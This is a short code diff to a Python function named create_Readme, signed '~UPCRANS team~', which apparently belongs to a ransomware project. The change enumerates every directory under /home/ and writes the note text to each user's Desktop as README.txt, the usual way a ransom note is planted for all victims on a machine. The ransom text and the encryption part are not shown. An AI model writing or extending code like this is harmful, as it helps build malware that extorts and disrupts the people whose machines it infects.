@@ -67,8 +67,11 @@ def create_Readme():
     ~UPCRANS team~  
     '''
 
-    with open('README.txt', 'w') as fo:
-                fo.write(text)
+    resultComm = subprocess.run(['ls', '/home/'], stdout=subprocess.PIPE).stdout.decode('utf-8')
+    list_users = resultComm.splitlines()
+    for user in list_users:    
+        with open('/home/'+user+'/Desktop/README.txt', 'w') as fo:
+                    fo.write(text)
     return 
 
 
